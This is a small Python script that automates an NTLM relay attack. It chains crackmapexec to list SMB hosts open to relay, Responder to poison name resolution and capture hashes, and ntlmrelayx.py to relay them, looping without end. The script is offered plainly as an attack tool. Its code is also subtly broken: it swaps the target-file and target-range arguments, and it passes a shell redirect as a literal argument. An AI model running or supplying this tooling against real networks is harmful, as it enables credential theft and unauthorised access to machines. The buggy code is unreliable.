#!/usr/bin/env python

import subprocess
import optparse

def sarguments():
	parser=optparse.OptionParser()
	parser.add_option("-i", dest="interface", help="Interface to listen for hashes")
	parser.add_option("-f", dest="targetfile", help="Target list file to be created for ntlmrelay")
	parser.add_option("-t", dest="targets", help="Target range")
	return  parser.parse_args()

def relay(interface, targets, targetfile):
	print("Starting the script" )
	subprocess.call(["timeout", "60", "cme", "smb", targets, "--gen-relay-list", targetfile ])
	subprocess.call(["responder", "-I", interface, "-rdwv", "&>dev/null &"])
	subprocess.call(["ntlmrelayx.py" ,"-tf", targetfile ])

(options, arguments) = sarguments()

try:
	while True:
		relay(options.interface, options.targetfile, options.targets)
except KeyboardInterrupt:
	print("SIGINT Ctrl+C received, exitting...")